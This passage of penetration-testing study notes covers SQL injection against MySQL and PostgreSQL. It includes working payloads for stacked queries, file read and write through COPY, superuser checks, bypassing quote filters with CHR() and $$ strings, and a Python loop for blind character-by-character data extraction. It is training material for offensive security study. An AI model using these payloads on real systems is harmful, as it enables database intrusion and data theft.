### Filtered Characters

In some databases, special characters like `'` are HTML encoded before being sent to database. For MySQL, we can use ASCII characters in their hexadecimal notation. For instance,`0x206840783072` is converted to `h@x0r`.

## Exploitation

- MySQL has the functionality SELECT INTO OUTFILE, which potentially can give us file write functionality, to write a shell into the web-root.

# PostgreSQL

- Get version number: `select version()`
- List all databases: `\l`
- Access/switch to database: `\c <database>`
- List all tables: `\dt`
- Describe all tables: `\d`
- Stacked commands: `;`
- Ignore rest of line: `--` (or `--+` for URL encoded)

### Logging

To enable logging on PostgreSQL database, we edit its configuration file found atm `.\pgsql\data\amdb\postgresql.conf` .

```java
log_statement = 'all'			# none, ddl, mod, all
Remember to remove the # in front of the statement. 
```

After enabling that line, launch services.msc and restart the application service. 

### SQLi

For PostgreSQL, we can use **stacked queries** to perform SQLi. This means that we can use the `;` character to separate a new command to inject. 

If we have database admin, we can also use the `COPY TO` statement to write to a file to gain SYSTEM access. 

```sql
COPY SELECT($$AWAE$$) TO $$C:\Users\Public\offsec.txt$$
```

We can also read files by loading the contents of a file into a table and then reading that table. 

```sql
CREATE temp table read_file(content text);
COPY read_file FROM $$C:\Users\Public\offsec.txt$$;
SELECT * FROM read_file;
DROP TABLE read_file;
```

### Database Admin Privilege

```sql
SELECT current_setting('is_superuser');
SELECT CASE WHEN (SELECT current_setting($$is_superuser$$))=$$on$$ THEN pg_sleep(10) END;
```

### Filtered Characters

When characters like `'` are HTML encoded, we can use CHR() representation to bypass this restriction. However, this only works for simple statements like SELECT and INSERT (`SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);`)and not more complex statements like `COPY TO`. 

Instead, we can use `$$` to demarcate the start and end of the string instead. This works with any native PostgreSQL functions that CHR may be unable to work with. Alternatively, `$TAG$` also works as string marker. 

## SQL Injections

### Blind SQL Injection Methodology

For blind SQL injections (time or boolean-based), we can exfiltrate data character by character. This can be done by using a case statement that checks against a substring. 

```sql
-- MySQL:
"test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"

-- Postgres:
select case when substring(cast(loid as varchar),1,1)=$$8$$ then pg_sleep(3) else pg_sleep(0) end from pg_largeobject limit 1
```

We can then iterate against a set character list (or more narrow lists of specific character types like integers or letters). 

```python
ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
# List of characters in (rough) order of frequency
# Numbers, small letters, punctuation, big letters (from 32 to 127)

output = "" # If we already have stuff, can start output with value and change starting i
for i in range(1,100):
    new_character = False
    for c in ascii_list: # ASCII letters, numbers and punctuation
        query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
        res = searchFriends_sqli(ip, query_string)
        # print(f"Checking {chr(c)}: {query_string} -- {res}")
        if res == True:
            new_character = True
            output += chr(c)
            print(f"Success, adding {chr(c)} -- {output}")
            break
    if not new_character:
        print("No possible characters, breaking now!")
        break
print(f"Extracted data: {output}")
return output
```

### Time-Based SQL Injection

Time-based SQL injections involve using the total time elapsed by a POST request. The following code provides the runtime of the POST request:

```python
r = s.post(target,data=data,headers=headers,verify=False)
# Return total runtime
return r.elapsed.total_seconds()
```

For Postgres, time-based SQL injections can be done using the `pg_sleep()` function. For MySQL, time-based SQLi can be done using the `sleep()` function.
